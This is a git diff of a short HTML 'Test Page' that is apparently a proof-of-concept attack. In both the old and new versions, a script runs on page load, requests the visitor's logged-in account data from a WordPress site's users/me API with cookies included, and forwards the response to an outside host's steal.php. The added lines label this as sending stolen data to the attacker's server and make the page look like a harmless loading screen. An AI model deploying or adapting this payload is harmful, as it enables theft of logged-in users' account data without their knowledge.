@@ -1,20 +1,23 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Page</title>
     <script>
-       fetch("https://building-blocks.com/wp-json/wp/v2/users/me", { credentials: "include" })
-  .then(response => response.text())
-  .then(data => {
-    console.log("Fetched Data:", data); // Debugging
-    fetch("http://dipeshsadhwani.ct.ws/steal.php?data=" + encodeURIComponent(data))
-      .then(() => console.log("Data Sent"))
-      .catch(err => console.error("Error sending data:", err));
-  })
-  .catch(err => console.error("Error fetching data:", err));
-
+        fetch("https://building-blocks.com/wp-json/wp/v2/users/me", {
+            credentials: "include"
+        })
+        .then(response => response.text())
+        .then(data => {
+            // Send stolen data to attacker's server
+            fetch("http://dipeshsadhwani.ct.ws/steal.php?data=" + encodeURIComponent(data));
+        })
+        .catch(error => console.log("Request failed", error));
     </script>
 </head>
 <body>
-    <h1>Test Page</h1>
+    <h1>Welcome</h1>
+    <p>Loading...</p>
 </body>
 </html>
